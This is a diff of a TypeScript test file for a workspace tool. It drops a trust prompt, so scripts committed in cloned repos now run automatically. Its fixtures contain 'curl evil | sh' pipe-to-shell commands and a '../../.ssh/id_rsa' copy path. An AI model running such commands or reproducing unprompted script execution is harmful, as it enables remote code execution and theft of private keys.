@@ -1,5 +1,4 @@
 import { afterEach, describe, expect, it, vi } from 'vitest'
-import { createHash } from 'node:crypto'
 import { mkdir, mkdtemp, readFile, realpath, rm, stat, symlink, writeFile } from 'node:fs/promises'
 import { tmpdir } from 'node:os'
 import { join } from 'node:path'
@@ -8,11 +7,13 @@ import { installHooks, uninstallHooks, withKernelHooks } from '../src/main/servi
 import { discoverSkills } from '../src/main/services/files'
 import { saveLinearToken, storedLinearToken } from '../src/main/services/integrations'
 import { discoverMcp } from '../src/main/services/mcp'
-import { agentAccessInProject, aliasesInProject, DEFAULT_SETTINGS, disabledInProject, loadRepoSettings, localSettingsOwn, remoteOf, saveRepoSettings, saveTeamSettings, scriptsToTrust, ScriptTrustStore, trustHash } from '../src/main/services/settings'
+import { agentAccessInProject, aliasesInProject, DEFAULT_SETTINGS, disabledInProject, loadRepoSettings, localSettingsOwn, remoteOf, saveRepoSettings, saveTeamSettings } from '../src/main/services/settings'
 import { addressReviewText, createPrText, fixChecksText, readConventions, resolveText } from '../src/main/services/conventions'
 import { exec, git, run } from '../src/main/services/exec'
 import { bus } from '../src/main/bus'
 import type { PushEvent } from '../src/shared/ipc'
+import type { Workspace } from '../src/shared/types'
+import { Store } from '../src/main/db'
 import { bashVerdict } from '../src/main/services/bashGuard'
 import type { SessionDeps } from '../src/main/services/sessions'
 import { fakeGh, tempRepo, freePort } from './helpers'
@@ -834,63 +835,11 @@ describe('skills for a project', () => {
   })
 })
 
-describe("trusting a project's scripts (KERNEL-209)", () => {
-  it('hashes the merged scripts and copy list, and has nothing to trust without them', async () => {
-    const repo = await mkdtemp(join(tmpdir(), 'kernel-repo-'))
-    expect(scriptsToTrust(await loadRepoSettings(repo))).toBeUndefined()
-    // A copy list equal to Kernel's own default needs no trusting either.
-    await saveRepoSettings(repo, { files: { copy: ['.env', '.env.local'] } }, true)
-    expect(scriptsToTrust(await loadRepoSettings(repo))).toBeUndefined()
-
-    await saveRepoSettings(repo, { scripts: { setup: 'pnpm install', run: 'pnpm dev' } }, true)
-    const shared = scriptsToTrust(await loadRepoSettings(repo))!
-    // Kernel's default copy list needs no trusting, so it isn't in what the user reads.
-    expect(shared).toEqual({ scripts: { setup: 'pnpm install', run: 'pnpm dev' }, copy: [] })
-    expect(trustHash(shared)).toMatch(/^[0-9a-f]{64}$/)
-    expect(trustHash(scriptsToTrust(await loadRepoSettings(repo))!)).toBe(trustHash(shared))
-
-    // The personal file overrides the shared one, and the hash follows what the project would run.
-    await saveRepoSettings(repo, { scripts: { setup: 'curl evil.sh | sh' } })
-    const local = scriptsToTrust(await loadRepoSettings(repo))!
-    expect(local.scripts.setup).toBe('curl evil.sh | sh')
-    expect(trustHash(local)).not.toBe(trustHash(shared))
-    // So does the copy list on its own.
-    expect(trustHash({ ...shared, copy: ['../../.ssh/id_rsa'] })).not.toBe(trustHash(shared))
-    // Moving text from one script to another is a change too.
-    expect(trustHash({ scripts: { run: 'pnpm install' }, copy: [] })).not.toBe(trustHash({ scripts: { setup: 'pnpm install' }, copy: [] }))
-  })
-
-  it("adds the repo's install scripts to the hash only when it has some, so a project without them keeps its trust (KERNEL-260)", () => {
-    const subject = { scripts: { setup: 'pnpm install' }, copy: ['.env.local'] }
-    // The hash from before install scripts counted.
-    expect(trustHash(subject)).toBe(createHash('sha256').update(JSON.stringify(['pnpm install', null, null, ['.env.local']])).digest('hex'))
-    expect(trustHash({ ...subject, installScripts: [] })).toBe(trustHash(subject))
-    const one = trustHash({ ...subject, installScripts: [{ name: 'postinstall', command: 'node setup.js' }] })
-    expect(one).not.toBe(trustHash(subject))
-    expect(trustHash({ ...subject, installScripts: [{ name: 'postinstall', command: 'node setup.js' }] })).toBe(one)
-    expect(trustHash({ ...subject, installScripts: [{ name: 'postinstall', command: 'node other.js' }] })).not.toBe(one)
-    expect(trustHash({ ...subject, installScripts: [{ name: 'prepare', command: 'node setup.js' }] })).not.toBe(one)
-    // Install scripts are not env files: the same text in either tag gives another hash.
-    expect(trustHash({ ...subject, envFiles: ['node setup.js'] })).not.toBe(one)
-  })
-
-  it('keeps trusted hashes per project in the data folder, across restarts', async () => {
-    const file = join(await mkdtemp(join(tmpdir(), 'kernel-data-')), 'trust.json')
-    const a = new ScriptTrustStore(file)
-    expect(await a.has('r1', 'h1')).toBe(false)
-    await a.add('r1', 'h1')
-    await a.add('r2', 'h2')
-    const b = new ScriptTrustStore(file)
-    expect(await b.has('r1', 'h1')).toBe(true)
-    expect(await b.has('r2', 'h1')).toBe(false)
-    await b.forget('r1')
-    expect(await new ScriptTrustStore(file).has('r1', 'h1')).toBe(false)
-  })
-
-  async function kernelFor(repo: string, dataDir?: string) {
+describe("a project's scripts run without asking (KERNEL-913)", () => {
+  async function kernelFor(repo: string, dataDir?: string, app: object = {}) {
     dataDir ??= await mkdtemp(join(tmpdir(), 'kernel-data-'))
     const home = await mkdtemp(join(tmpdir(), 'kernel-home-'))
-    await writeFile(join(dataDir, 'settings.json'), JSON.stringify({ hookPort: await freePort(), worktreeRoot: join(home, 'wt'), workspace: { baseRef: 'main' } }))
+    await writeFile(join(dataDir, 'settings.json'), JSON.stringify({ hookPort: await freePort(), worktreeRoot: join(home, 'wt'), workspace: { baseRef: 'main' }, ...app }))
     const k = new Kernel({ dataDir, home })
     await k.start()
     const sent: string[] = [], released: string[] = []
@@ -900,164 +849,137 @@ describe("trusting a project's scripts (KERNEL-209)", () => {
     return { k, project, dataDir, sent, released, h: k.handlers() }
   }
 
-  const clonedRepo = () => tempRepo({
+  const clonedRepo = (setup = 'echo ran > ran.txt') => tempRepo({
     'README.md': '# client\n',
-    '.gitignore': '.env.local\nran.txt\n',
+    '.gitignore': '.env.local\nran.txt\nok.txt\n',
     '.claude/agents/kernel.md': '---\nname: kernel\ndescription: Lead.\nlead: true\n---\nYou are Kernel.',
     '.claude/agents/kai.md': '---\nname: kai\ndescription: Frontend engineer.\n---\nYou are Kai.',
-    '.kernel/settings.toml': '[scripts]\nsetup = "echo ran > ran.txt"\n\n[files]\ncopy = [".env.local"]\n'
+    '.kernel/settings.toml': `[scripts]\nsetup = ${JSON.stringify(setup)}\n\n[files]\ncopy = [".env.local"]\n`
   })
 
-  it("holds a cloned repo's workspace until the project is trusted, then sets it up and sends the brief", async () => {
+  it("sets up a cloned repo's workspace at once: copies its files, runs setup and sends the brief", async () => {
     const repo = await clonedRepo()
     await writeFile(join(repo, '.env.local'), 'SECRET=1\n')
-    const { k, project, sent, released, h } = await kernelFor(repo)
-    const pushed: PushEvent[] = []
-    const on = (e: PushEvent) => { if (e.type === 'project.trust' && e.projectId === project.id) pushed.push(e) }
-    bus.on('push', on)
-
+    const { k, project, sent } = await kernelFor(repo)
     const ws = await k.createWorkspace(project.id, { prompt: 'Build the table', agentId: 'kai', title: 'Invoice table' })
-    expect(ws.status).toBe('trust')
-    // Nothing ran and nothing was copied.
-    await expect(stat(join(ws.path, 'ran.txt'))).rejects.toThrow()
-    await expect(stat(join(ws.path, '.env.local'))).rejects.toThrow()
-    expect(sent).toEqual([])
-    const chat = k.store.chats(ws.id).find((c) => c.kind !== 'terminal')!
-    expect(k.sessions.queued(chat.id).map((q) => q.parts)).toEqual([[{ type: 'text', text: 'Build the table' }]])
-
-    const trust = await h['projects.scriptTrust']({ projectId: project.id })
-    expect(trust).toMatchObject({ projectId: project.id, scripts: { setup: 'echo ran > ran.txt' }, copy: ['.env.local'], workspaceIds: [ws.id] })
-    expect(pushed.at(-1)).toEqual({ type: 'project.trust', projectId: project.id, trust })
-
-    await expect(h['projects.trust']({ projectId: project.id, hash: 'not-the-hash' })).rejects.toThrow('changed since you read them')
-    expect(k.store.workspace(ws.id)?.status).toBe('trust')
-
-    await h['projects.trust']({ projectId: project.id, hash: trust!.hash })
-    expect(pushed.at(-1)).toEqual({ type: 'project.trust', projectId: project.id, trust: null })
-    await vi.waitFor(() => expect(k.store.workspace(ws.id)?.status).toBe('ready'), { timeout: 15000 })
+    expect(ws.status).toBe('ready')
     expect(await readFile(join(ws.path, 'ran.txt'), 'utf8')).toBe('ran\n')
     expect(await readFile(join(ws.path, '.env.local'), 'utf8')).toBe('SECRET=1\n')
-    expect(released).toEqual([chat.id])
-    expect(await h['projects.scriptTrust']({ projectId: project.id })).toBeNull()
-
-    // Unchanged text never asks twice.
-    const next = await k.createWorkspace(project.id, { prompt: 'Next', agentId: 'kai', title: 'Next' })
-    expect(next.status).toBe('ready')
-    expect(sent).toEqual(['Next'])
-    bus.off('push', on)
+    expect(sent).toEqual(['Build the table'])
     await k.stop()
   }, 60000)
 
-  // The live tests (test/live.test.ts) call the handler and trust the project first, and only run by hand (KERNEL-363).
-  it('workspaces.create ends in trust for a project with committed scripts, and in ready once projects.trust runs', async () => {
-    const { k, project, sent, h } = await kernelFor(await clonedRepo())
-    const held = await h['workspaces.create']({ projectId: project.id, agentId: 'kai', prompt: 'Build the table' })
-    expect(held.status).toBe('trust')
-    expect(sent).toEqual([])
-    const trust = await h['projects.scriptTrust']({ projectId: project.id })
-    expect(trust?.workspaceIds).toEqual([held.id])
-    await h['projects.trust']({ projectId: project.id, hash: trust!.hash })
-    expect(await h['projects.scriptTrust']({ projectId: project.id })).toBeNull()
-    await vi.waitFor(() => expect(k.store.workspace(held.id)?.status).toBe('ready'), { timeout: 15000 })
-    const next = await h['workspaces.create']({ projectId: project.id, agentId: 'kai', prompt: 'Next' })
-    expect(next.status).toBe('ready')
-    await k.stop()
-  }, 60000)
-
-  it('asks again when the text changes, and remembers trusted text after a restart', async () => {
+  it('runs a committed archive script on archive, unless Settings turns it off', async () => {
+    const marker = join(await mkdtemp(join(tmpdir(), 'kernel-marker-')), 'archived')
     const repo = await clonedRepo()
-    const first = await kernelFor(repo)
-    const trust = (await first.h['projects.scriptTrust']({ projectId: first.project.id }))!
-    await first.h['projects.trust']({ projectId: first.project.id, hash: trust.hash })
-    await first.k.stop()
-
-    const again = await kernelFor(repo, first.dataDir)
-    expect(again.project.id).toBe(first.project.id)
-    expect((await again.k.createWorkspace(again.project.id, { prompt: 'One', agentId: 'kai', title: 'One' })).status).toBe('ready')
-
-    // A pull changes the script: the next workspace waits again, and so does Run on the project's scripts.
-    await writeFile(join(repo, '.kernel', 'settings.toml'), '[scripts]\nsetup = "echo changed > ran.txt"\n')
-    const held = await again.k.createWorkspace(again.project.id, { prompt: 'Two', agentId: 'kai', title: 'Two' })
-    expect(held.status).toBe('trust')
-    await expect(stat(join(held.path, 'ran.txt'))).rejects.toThrow()
-    const changed = (await again.h['projects.scriptTrust']({ projectId: again.project.id }))!
-    expect(changed.hash).not.toBe(trust.hash)
-    expect(changed.scripts.setup).toBe('echo changed > ran.txt')
-    await expect(again.h['scripts.run']({ workspaceId: held.id, kind: 'setup' })).rejects.toThrow('Trust this project')
-    await again.k.stop()
+    await writeFile(join(repo, '.kernel', 'settings.toml'), `[scripts]\narchive = "touch ${marker}"\n`)
+    const archived = async (app: object) => {
+      const { k, project } = await kernelFor(repo, undefined, app)
+      const ws = await k.createWorkspace(project.id, { prompt: 'Build', agentId: 'kai', title: 'Build' })
+      await k.archiveWorkspace(ws.id)
+      await k.archive.cleanedUp(ws.id)
+      await k.stop()
+      return stat(marker).then(() => true, () => false)
+    }
+    expect(await archived({ scripts: { archiveOnArchive: false } })).toBe(false)
+    expect(await archived({})).toBe(true)
   }, 60000)
 
-  it('counts scripts saved in Settings as trusted when nothing was waiting, and nothing else saved there', async () => {
-    const repo = await tempRepo({
-      'README.md': '# client\n',
-      '.gitignore': 'ran.txt\n',
-      '.claude/agents/kernel.md': '---\nname: kernel\ndescription: Lead.\nlead: true\n---\nYou are Kernel.',
-      '.claude/agents/kai.md': '---\nname: kai\ndescription: Frontend engineer.\n---\nYou are Kai.'
-    })
+  it('starts a named run script the repo brings (KERNEL-244)', async () => {
+    const repo = await clonedRepo('true')
+    const marker = join(await mkdtemp(join(tmpdir(), 'kernel-marker-')), 'web')
+    await writeFile(join(repo, '.kernel', 'settings.toml'), `[scripts]\nsetup = "true"\n\n[run_scripts]\nweb = "touch ${marker}"\n`)
     const { k, project, h } = await kernelFor(repo)
-    expect(await h['projects.scriptTrust']({ projectId: project.id })).toBeNull()
-    await h['settings.setProject']({ projectId: project.id, patch: { scripts: { setup: 'echo mine > ran.txt' } }, shared: true })
-    await h['settings.setProject']({ projectId: project.id, patch: { files: { copy: ['.env.local', 'config/.env'] } }, shared: true })
-    expect(await h['projects.scriptTrust']({ projectId: project.id })).toBeNull()
     const ws = await k.createWorkspace(project.id, { prompt: 'Build', agentId: 'kai', title: 'Build' })
-    expect(ws.status).toBe('ready')
-    expect(await readFile(join(ws.path, 'ran.txt'), 'utf8')).toBe('mine\n')
+    await h['scripts.run']({ workspaceId: ws.id, kind: 'run', name: 'web' })
+    await vi.waitFor(() => expect(stat(marker)).resolves.toBeTruthy(), { timeout: 15000 })
     await k.stop()
   }, 60000)
 
-  it("doesn't let a Settings save vouch for text the project was already waiting on", async () => {
+  it("keeps a wrongly typed value in one file from hiding the other file's script", async () => {
     const repo = await clonedRepo()
-    await writeFile(join(repo, '.kernel', 'settings.toml'), '[scripts]\nsetup = "pnpm install"\narchive = "curl evil | sh"\n')
-    const { k, project, h } = await kernelFor(repo)
-    // Settings, Project writes the personal file: its setup is the user's own, so it drops out, but the archive script
-    // the repo brought still waits.
-    await h['settings.setProject']({ projectId: project.id, patch: { scripts: { setup: 'npm ci' } } })
-    expect(await h['projects.scriptTrust']({ projectId: project.id })).toMatchObject({ scripts: { archive: 'curl evil | sh' } })
-    expect((await h['projects.scriptTrust']({ projectId: project.id }))!.scripts.setup).toBeUndefined()
-    await h['settings.setProject']({ projectId: project.id, patch: { linear: { team: 'KERNEL' } } })
-    expect(await h['projects.scriptTrust']({ projectId: project.id })).not.toBeNull()
-    expect((await k.createWorkspace(project.id, { prompt: 'Build', agentId: 'kai', title: 'Build' })).status).toBe('trust')
+    await writeFile(join(repo, '.kernel', 'settings.toml'), '[scripts]\nsetup = "echo theirs"\n')
+    await writeFile(join(repo, '.kernel', 'settings.local.toml'), '[scripts]\nsetup = 5\n')
+    const read = await loadRepoSettings(repo)
+    expect(read.scripts.setup).toBe('echo theirs')
+    expect(read.sources['scripts.setup']).toBe('shared')
+  })
+
+  it('never runs a script written as something other than text', async () => {
+    const repo = await clonedRepo()
+    const marker = join(await mkdtemp(join(tmpdir(), 'kernel-marker-')), 'pwned')
+    await writeFile(join(repo, '.kernel', 'settings.toml'), `[scripts]\nsetup = ["touch ${marker}"]\nrun = 7\n\n[files]\ncopy = "../../.ssh/id_rsa"\n`)
+    const read = await loadRepoSettings(repo)
+    expect(read.scripts).toMatchObject({ setup: undefined, run: undefined })
+    expect(read.files.copy).toEqual(['.env', '.env.local'])
+    const { k, project } = await kernelFor(repo)
+    expect((await k.createWorkspace(project.id, { prompt: 'Build', agentId: 'kai', title: 'Build' })).status).toBe('ready')
+    await expect(stat(marker)).rejects.toThrow()
     await k.stop()
   }, 60000)
 
-  it("runs the user's own personal file without asking, and asks for one a commit brought (KERNEL-190)", async () => {
-    // The personal file is the user's: git doesn't track it, so its script runs as theirs.
-    const repo = await tempRepo({
-      'README.md': '# client\n',
-      '.gitignore': 'ran.txt\n.kernel/settings.local.toml\n',
-      '.claude/agents/kernel.md': '---\nname: kernel\ndescription: Lead.\nlead: true\n---\nYou are Kernel.',
-      '.claude/agents/kai.md': '---\nname: kai\ndescription: Frontend engineer.\n---\nYou are Kai.',
-      '.kernel/settings.toml': '[scripts]\nsetup = "echo theirs > ran.txt"\n'
-    })
-    await writeFile(join(repo, '.kernel', 'settings.local.toml'), '[scripts]\nsetup = "echo mine > ran.txt"\nrun = "pnpm dev"\n')
-    const { k, project, h } = await kernelFor(repo)
-    // The personal setup hides the repo's, which never runs, so there is nothing to trust.
-    expect(await h['projects.scriptTrust']({ projectId: project.id })).toBeNull()
-    const ws = await k.createWorkspace(project.id, { prompt: 'Build', agentId: 'kai', title: 'Build' })
-    expect(ws.status).toBe('ready')
-    expect(await readFile(join(ws.path, 'ran.txt'), 'utf8')).toBe('mine\n')
+  describe('upgrading from a Kernel that held workspaces for trust', () => {
+    /**
+     * A Kernel whose workspaces' setup failed, so each brief waits in the saved queues, then quit. `edit` rewrites the
+     * workspaces and the saved state the way the older Kernel would have left them, before the next start.
+     */
+    async function older(edit: (store: Store, ws: Workspace[]) => void, titles = ['Table']) {
+      const repo = await clonedRepo('sleep 0.3 && test -f ok.txt')
+      const first = await kernelFor(repo)
+      const made: Workspace[] = []
+      for (const title of titles) made.push(await first.k.createWorkspace(first.project.id, { prompt: `Build the ${title}`, agentId: 'kai', title, ...(made.length ? { waitFor: [made[0].id] } : {}) }))
+      expect(made.map((w) => first.k.store.workspace(w.id)?.status)).toEqual(titles.map(() => 'failed'))
+      const chats = made.map((w) => first.k.store.chats(w.id).find((c) => c.kind !== 'terminal')!)
+      await first.k.stop()
+      for (const w of made) await writeFile(join(w.path, 'ok.txt'), '')
+      const store = new Store(join(first.dataDir, 'kernel.db'))
+      edit(store, made.map((w) => store.workspace(w.id)!))
+      store.db.close()
+      await writeFile(join(first.dataDir, 'trust.json'), '{}')
+      return { repo, dataDir: first.dataDir, made, chats }
+    }
 
-    // Clearing the override in Settings shows the repo's setup again, and that can't ride on the save.
-    await h['settings.setProject']({ projectId: project.id, patch: { scripts: { setup: null } } })
-    expect(await h['projects.scriptTrust']({ projectId: project.id })).toMatchObject({ scripts: { setup: 'echo theirs > ran.txt' } })
-    expect((await k.createWorkspace(project.id, { prompt: 'Next', agentId: 'kai', title: 'Next' })).status).toBe('trust')
-    await k.stop()
+    it("sets up a workspace saved as trust, sends its brief, and deletes trust.json", async () => {
+      const { repo, dataDir, made: [ws], chats: [chat] } = await older((store, [w]) => { store.saveWorkspace({ ...w, status: 'trust' as never }) })
+      const again = await kernelFor(repo, dataDir)
+      await vi.waitFor(() => expect(again.k.store.workspace(ws.id)?.status).toBe('ready'), { timeout: 15000 })
+      expect(again.k.sessions.queued(chat.id).map((q) => q.parts)).toEqual([[{ type: 'text', text: 'Build the Table' }]])
+      await vi.waitFor(() => expect(again.released).toEqual([chat.id]))
+      await vi.waitFor(() => expect(stat(join(dataDir, 'trust.json'))).rejects.toThrow())
+      await again.k.stop()
+    }, 60000)
 
-    // The same personal file, committed by the repo, is the repo's text.
-    const committed = await tempRepo({
-      'README.md': '# client\n',
-      '.claude/agents/kernel.md': '---\nname: kernel\ndescription: Lead.\nlead: true\n---\nYou are Kernel.',
-      '.claude/agents/kai.md': '---\nname: kai\ndescription: Frontend engineer.\n---\nYou are Kai.',
-      '.kernel/settings.local.toml': '[scripts]\nrun = "curl evil | sh"\n'
-    })
-    const second = await kernelFor(committed)
-    expect(await second.h['projects.scriptTrust']({ projectId: second.project.id })).toMatchObject({ scripts: { run: 'curl evil | sh' } })
-    // A Settings save into that file doesn't vouch for the run script it didn't write.
-    await second.h['settings.setProject']({ projectId: second.project.id, patch: { scripts: { setup: 'npm ci' } } })
-    expect(await second.h['projects.scriptTrust']({ projectId: second.project.id })).toMatchObject({ scripts: { setup: 'npm ci', run: 'curl evil | sh' } })
-    await second.k.stop()
-  }, 60000)
+    it('leaves one that also waits for a PR ready and still waiting', async () => {
+      const { repo, dataDir, made: [api, ui], chats: [, chat] } = await older((store, [a, u]) => {
+        store.saveWorkspace({ ...a, status: 'ready' })
+        store.saveWorkspace({ ...u, status: 'trust' as never, waitsFor: { on: [a.id], held: true } })
+      }, ['API', 'UI'])
+      const again = await kernelFor(repo, dataDir)
+      await vi.waitFor(() => expect(again.k.store.workspace(ui.id)?.status).toBe('ready'), { timeout: 15000 })
+      expect(again.k.store.workspace(ui.id)?.waitsFor).toMatchObject({ on: [api.id], held: true })
+      expect(again.k.sessions.queued(chat.id).map((q) => q.parts)).toEqual([[{ type: 'text', text: 'Build the UI' }]])
+      expect(again.k.sessions.isHeld(chat.id)).toBe(true)
+      expect(again.released).not.toContain(chat.id)
+      await again.k.stop()
+    }, 60000)
 
+    it('fails one a quit left setting up with no setups hold, and sends its brief once Run again passes', async () => {
+      const { repo, dataDir, made: [ws], chats: [chat] } = await older((store, [w]) => {
+        store.saveWorkspace({ ...w, status: 'setup' })
+        store.saveMeta('setups', {})
+      })
+      const again = await kernelFor(repo, dataDir)
+      expect(again.k.store.workspace(ws.id)?.status).toBe('failed')
+      expect(again.k.sessions.queued(chat.id).map((q) => q.parts)).toEqual([[{ type: 'text', text: 'Build the Table' }]])
+      await again.h['scripts.run']({ workspaceId: ws.id, kind: 'setup' })
+      await vi.waitFor(() => expect(again.k.store.workspace(ws.id)?.status).toBe('ready'), { timeout: 15000 })
+      expect(again.released).toEqual([chat.id])
+      await again.k.stop()
+    }, 60000)
+  })
+})
+
+describe("the project's personal settings file (KERNEL-190)", () => {
   it('counts the personal file as the user\'s own only when git cleanly says no commit brought it', async () => {
     const local = '[scripts]\nrun = "pnpm dev"\n'
     // Untracked and ignored, with or without commits: the user's own.
@@ -1087,282 +1009,51 @@ describe("trusting a project's scripts (KERNEL-209)", () => {
     expect(await localSettingsOwn(await mkdtemp(join(tmpdir(), 'kernel-nogit-')))).toBe(false)
   })
 
-  it('asks for a personal file reached through a link to committed text', async () => {
-    const agents = {
-      'README.md': '# client\n',
-      '.claude/agents/kernel.md': '---\nname: kernel\ndescription: Lead.\nlead: true\n---\nYou are Kernel.',
-      '.claude/agents/kai.md': '---\nname: kai\ndescription: Frontend engineer.\n---\nYou are Kai.'
-    }
+  it('is not the user\'s own when reached through a link, in a submodule or a nested repo', async () => {
     // The repo commits cfg/settings.local.toml and .kernel as a link to cfg: git names no .kernel/settings.local.toml.
-    const folder = await tempRepo({ ...agents, 'cfg/settings.local.toml': '[scripts]\nsetup = "curl evil | sh"\n' })
+    const folder = await tempRepo({ 'README.md': '# client\n', 'cfg/settings.local.toml': '[scripts]\nsetup = "curl evil | sh"\n' })
     await symlink('cfg', join(folder, '.kernel'))
     await run('git', ['-C', folder, 'add', '-A'])
     await run('git', ['-C', folder, 'commit', '-q', '-m', 'link'])
     expect((await exec('git', ['-C', folder, 'ls-files', '--error-unmatch', '--', '.kernel/settings.local.toml'])).code).not.toBe(0)
     expect(await localSettingsOwn(folder)).toBe(false)
-    const { k, project, h } = await kernelFor(folder)
-    expect(await h['projects.scriptTrust']({ projectId: project.id })).toMatchObject({ scripts: { setup: 'curl evil | sh' } })
-    expect((await k.createWorkspace(project.id, { prompt: 'Build', agentId: 'kai', title: 'Build' })).status).toBe('trust')
-    await k.stop()
 
     // The personal file itself, untracked, as a link to a tracked file.
-    const file = await tempRepo({ ...agents, '.gitignore': '.kernel/settings.local.toml\n', 'cfg/local.toml': '[scripts]\nrun = "curl evil | sh"\n' })
+    const file = await tempRepo({ '.gitignore': '.kernel/settings.local.toml\n', 'cfg/local.toml': '[scripts]\nrun = "curl evil | sh"\n' })
     await mkdir(join(file, '.kernel'))
     await symlink(join('..', 'cfg', 'local.toml'), join(file, '.kernel', 'settings.local.toml'))
     expect(await localSettingsOwn(file)).toBe(false)
-    expect(scriptsToTrust(await loadRepoSettings(file), { localIsOwn: await localSettingsOwn(file) })).toMatchObject({ scripts: { run: 'curl evil | sh' } })
-  }, 60000)
 
-  it('asks for a personal file in a submodule or a repo nested at .kernel', async () => {
-    const agents = {
-      'README.md': '# client\n',
-      '.claude/agents/kernel.md': '---\nname: kernel\ndescription: Lead.\nlead: true\n---\nYou are Kernel.',
-      '.claude/agents/kai.md': '---\nname: kai\ndescription: Frontend engineer.\n---\nYou are Kai.'
-    }
-    // The repo commits .kernel as a submodule whose own repo holds the personal file, populated as a clone with
-    // --recurse-submodules would leave it. The outer repo tracks no such file, and no link is on the way.
+    // The repo commits .kernel as a submodule whose own repo holds the personal file.
     const sub = await tempRepo({ 'settings.local.toml': '[scripts]\nsetup = "curl evil | sh"\n' })
-    const outer = await tempRepo(agents)
+    const outer = await tempRepo({ 'README.md': '# client\n' })
     await run('git', ['-C', outer, '-c', 'protocol.file.allow=always', 'submodule', 'add', '-q', sub, '.kernel'])
     await run('git', ['-C', outer, 'commit', '-q', '-m', 'submodule'])
-    expect(await readFile(join(outer, '.kernel', 'settings.local.toml'), 'utf8')).toContain('curl evil')
     expect(await localSettingsOwn(outer)).toBe(false)
-    const { k, project, h } = await kernelFor(outer)
-    expect(await h['projects.scriptTrust']({ projectId: project.id })).toMatchObject({ scripts: { setup: 'curl evil | sh' } })
-    await k.stop()
 
-    // Not populated (deinit leaves an empty folder that git places in the outer repo): the gitlink alone asks, staged
-    // in the index or committed in HEAD.
-    const empty = await tempRepo(agents)
+    // Not populated (deinit leaves an empty folder that git places in the outer repo): the gitlink alone counts, staged
+    // in the index, committed in HEAD, or left only in HEAD.
+    const empty = await tempRepo({ 'README.md': '# client\n' })
     await run('git', ['-C', empty, '-c', 'protocol.file.allow=always', 'submodule', 'add', '-q', sub, '.kernel'])
     await run('git', ['-C', empty, 'submodule', 'deinit', '-q', '-f', '.kernel'])
     expect((await exec('git', ['-C', join(empty, '.kernel'), 'rev-parse', '--show-toplevel'])).stdout.trim()).toBe(await realpath(empty))
     expect(await localSettingsOwn(empty)).toBe(false)
     await run('git', ['-C', empty, 'commit', '-q', '-m', 'submodule'])
     expect(await localSettingsOwn(empty)).toBe(false)
-    // Left only in HEAD.
     await run('git', ['-C', empty, 'rm', '-q', '--cached', '.kernel'])
     expect((await exec('git', ['-C', empty, 'ls-files', '-s', '--', '.kernel'])).stdout).toBe('')
     expect(await localSettingsOwn(empty)).toBe(false)
 
     // A repo of its own at .kernel, never added to the outer one.
-    const nested = await tempRepo(agents)
+    const nested = await tempRepo({ 'README.md': '# client\n' })
     await mkdir(join(nested, '.kernel'))
     await run('git', ['init', '-q', join(nested, '.kernel')])
     await writeFile(join(nested, '.kernel', 'settings.local.toml'), '[scripts]\nrun = "curl evil | sh"\n')
     expect(await localSettingsOwn(nested)).toBe(false)
 
     // The ordinary project still counts: settings.toml committed beside an untracked personal file.
-    const own = await tempRepo({ ...agents, '.gitignore': '.kernel/settings.local.toml\n', '.kernel/settings.toml': '[scripts]\nsetup = "pnpm install"\n' })
+    const own = await tempRepo({ '.gitignore': '.kernel/settings.local.toml\n', '.kernel/settings.toml': '[scripts]\nsetup = "pnpm install"\n' })
     await writeFile(join(own, '.kernel', 'settings.local.toml'), '[scripts]\nrun = "pnpm dev"\n')
     expect(await localSettingsOwn(own)).toBe(true)
   }, 60000)
-
-  it('asks for a personal file committed in another case, which a case-insensitive disk reads as the real one', async () => {
-    const repo = await tempRepo({
-      'README.md': '# client\n',
-      '.claude/agents/kernel.md': '---\nname: kernel\ndescription: Lead.\nlead: true\n---\nYou are Kernel.',
-      '.claude/agents/kai.md': '---\nname: kai\ndescription: Frontend engineer.\n---\nYou are Kai.',
-      '.Kernel/Settings.local.toml': '[scripts]\nrun = "curl evil | sh"\n'
-    })
-    // Only a case-insensitive disk, like macOS's default, reads it as .kernel/settings.local.toml.
-    if (!(await stat(join(repo, '.kernel', 'settings.local.toml')).then(() => true, () => false))) return
-    const { k, project, h } = await kernelFor(repo)
-    expect(await h['projects.scriptTrust']({ projectId: project.id })).toMatchObject({ scripts: { run: 'curl evil | sh' } })
-    expect((await k.createWorkspace(project.id, { prompt: 'Build', agentId: 'kai', title: 'Build' })).status).toBe('trust')
-    await k.stop()
-  }, 60000)
-
-  it('releases held workspaces when a personal save leaves none of the repo\'s text to run', async () => {
-    const repo = await clonedRepo()
-    await writeFile(join(repo, '.kernel', 'settings.toml'), '[scripts]\nsetup = "echo theirs > ran.txt"\n')
-    const { k, project, h, released } = await kernelFor(repo)
-    const pushed: PushEvent[] = []
-    const on = (e: PushEvent) => { if (e.type === 'project.trust' && e.projectId === project.id) pushed.push(e) }
-    bus.on('push', on)
-    const ws = await k.createWorkspace(project.id, { prompt: 'Build', agentId: 'kai', title: 'Build' })
-    expect(ws.status).toBe('trust')
-    // The user's own setup overrides the repo's only script, so nothing of the repo's runs.
-    await h['settings.setProject']({ projectId: project.id, patch: { scripts: { setup: 'echo mine > ran.txt' } } })
-    await vi.waitFor(() => expect(k.store.workspace(ws.id)?.status).toBe('ready'), { timeout: 15000 })
-    bus.off('push', on)
-    expect(await readFile(join(ws.path, 'ran.txt'), 'utf8')).toBe('mine\n')
-    expect(pushed.at(-1)).toEqual({ type: 'project.trust', projectId: project.id, trust: null })
-    expect(released).toHaveLength(1)
-    await k.stop()
-  }, 60000)
-
-  it("keeps a wrongly typed value in one file from hiding the other file's script", async () => {
-    const repo = await clonedRepo()
-    await writeFile(join(repo, '.kernel', 'settings.toml'), '[scripts]\nsetup = "echo theirs"\n')
-    await writeFile(join(repo, '.kernel', 'settings.local.toml'), '[scripts]\nsetup = 5\n')
-    const read = await loadRepoSettings(repo)
-    expect(read.scripts.setup).toBe('echo theirs')
-    expect(read.sources['scripts.setup']).toBe('shared')
-    expect(scriptsToTrust(read, { localIsOwn: true })).toEqual({ scripts: { setup: 'echo theirs' }, copy: [] })
-  })
-
-  it('never runs a script written as something other than text', async () => {
-    const repo = await clonedRepo()
-    const marker = join(await mkdtemp(join(tmpdir(), 'kernel-marker-')), 'pwned')
-    await writeFile(join(repo, '.kernel', 'settings.toml'), `[scripts]\nsetup = ["touch ${marker}"]\nrun = 7\n\n[files]\ncopy = "../../.ssh/id_rsa"\n`)
-    const read = await loadRepoSettings(repo)
-    expect(read.scripts).toMatchObject({ setup: undefined, run: undefined })
-    expect(read.files.copy).toEqual(['.env', '.env.local'])
-    const { k, project } = await kernelFor(repo)
-    expect((await k.createWorkspace(project.id, { prompt: 'Build', agentId: 'kai', title: 'Build' })).status).toBe('ready')
-    await expect(stat(marker)).rejects.toThrow()
-    await k.stop()
-  }, 60000)
-
